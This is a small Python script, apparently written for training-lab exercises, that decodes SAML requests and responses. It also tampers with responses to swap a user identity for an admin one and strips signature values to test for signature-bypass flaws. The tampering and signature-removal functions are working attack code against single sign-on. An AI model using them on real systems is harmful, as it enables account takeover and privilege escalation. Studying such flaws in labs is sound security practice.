#Script may not work entirely
#Was updating it everytime i finished an exercise
#But one of them wasnt working so I starter using SAML raider form burp
#Still didnt work


#So SAML on pause for now


import base64
import urllib.parse
import zlib
import io
from lxml import etree
import pyperclip
import re

def decode_saml_request():
    saml_request = input("Enter the encoded SAML request: ")
    decoded_request = urllib.parse.unquote(saml_request)
    xml = zlib.decompress(base64.b64decode(decoded_request), -15).decode('utf-8')
    buf = io.BytesIO(xml.encode('utf-8'))
    doc = etree.parse(buf)
    print("Result copied to your clipboard")
    return etree.tostring(doc.getroot(), pretty_print=True).decode('utf-8')

def decode_saml_response():
    saml_response = input("Enter the encoded SAML response: ")
    url_decoded_txt = urllib.parse.unquote(saml_response)
    decoded_txt = base64.b64decode(url_decoded_txt, validate=True).decode('utf-8')
    return decoded_txt

def response_tampering(old, new):
    decoded_txt = decode_saml_response()
    result = decoded_txt.replace(old, new)
    print("Result copied to your clipboard")
    return result

def remove_signature_response():
    decoded_response = decode_saml_response()
    signature_value_pattern = re.compile(r'<ds:SignatureValue>(.*?)</ds:SignatureValue>', re.DOTALL)
    modified_response = re.sub(signature_value_pattern, '<ds:SignatureValue></ds:SignatureValue>', decoded_response)
    encoded_response = base64.b64encode(modified_response.encode('utf-8')).decode('utf-8')
    print("Result copied to your clipboard")
    return encoded_response

def main():
    print("="*60)
    print("SAML TOOLS".center(60))
    print("="*60)
    print("1. Decode SAML request")
    print("2. Decode SAML response")
    print("3. SAML response tampering ( username / email )")
    print("4. Remove signature content")


    choice = input("Choose an option : ")
    while choice != "q":
        print("="*60)
        print("SAML TOOLS".center(60))
        print("="*60)
        print("1. Decode SAML request")
        print("2. Decode SAML response")
        print("3. SAML response tampering ( username / email )")


        if choice == '1':
            try:
                pyperclip.copy(decode_saml_request())
            except Exception as e:
                print(f"Error decoding SAML request: {e}")
        elif choice == '2':
            try:
                decoded_response = decode_saml_response()
                print("Decoded SAML Response:")
                print(decoded_response)
            except Exception as e:
                print(f"Error decoding SAML response: {e}")
        elif choice == '3':
            try:
                old = input("Enter what you used to signup as ( ex user123@libcurl.so ) : ")
                new = input("Enter what you want your user to end up as ( ex admin@libcurl.so ) : ")
                print(response_tampering(old, new))
            except Exception as e:
                print(f"Error decoding SAML response: {e}")   
        elif choice == '4':
            try:
                pyperclip.copy(remove_signature_response())
                
            except Exception as e:
                print(f"Error decoding SAML response: {e}")   
        else:
            print("Invalid choice.")
        choice = input("Choose an option : ")
if __name__ == "__main__":
    main()


